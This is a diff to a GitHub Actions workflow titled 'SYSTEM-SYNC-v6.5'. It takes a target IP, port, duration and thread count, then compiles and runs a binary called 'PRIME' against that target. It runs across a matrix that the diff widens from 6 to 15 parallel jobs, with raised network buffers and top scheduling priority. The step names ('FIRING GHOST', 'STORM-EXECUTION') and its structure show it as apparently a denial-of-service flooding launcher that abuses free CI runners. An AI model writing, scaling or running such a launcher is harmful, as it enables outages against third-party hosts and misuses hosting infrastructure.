@@ -3,41 +3,31 @@ name: ⚔️ SYSTEM-SYNC-v6.5 ⚔️
 on:
   workflow_dispatch:
     inputs:
-      host:
-        description: 'TARGET IP'
-        required: true
-      port:
-        description: 'TARGET PORT'
-        required: true
-      time:
-        description: 'DURATION (SEC)'
-        required: true
-      threads: 
-        description: 'THREADS'
-        required: true
+      host: { required: true }
+      port: { required: true }
+      time: { required: true }
+      threads: { required: true }
 
 jobs:
   STORM-EXECUTION:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
-      max-parallel: 6 
       matrix:
-        node: [1, 2, 3, 4, 5, 6] 
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15] 
     steps:
       - name: 🛰️ INITIALIZING
         uses: actions/checkout@v4
 
       - name: 🔥 FIRING GHOST v6.5
         run: |
-          # 1. Compilation with -O3 and -march=native (Hardware Specific Speed)
-          gcc -O3 -march=native prime.c -o PRIME -lpthread
+          gcc -Ofast -march=native prime.c -o PRIME -lpthread
           chmod +x PRIME
           
-          # 2. Limit Core Locking & Priority Execution
-          # taskset -c 0,1 ensures both CPU cores focus 100% on the binary
-          sudo sysctl -w net.core.rmem_max=26214400
-          sudo sysctl -w net.core.wmem_max=26214400
+          # Network Buffer Optimization
+          sudo sysctl -w net.core.rmem_max=4194304
+          sudo sysctl -w net.core.wmem_max=4194304
           
-          taskset -c 0,1 ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+          # Priority Execution on both cores
+          sudo nice -n -20 taskset -c 0,1 ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
           
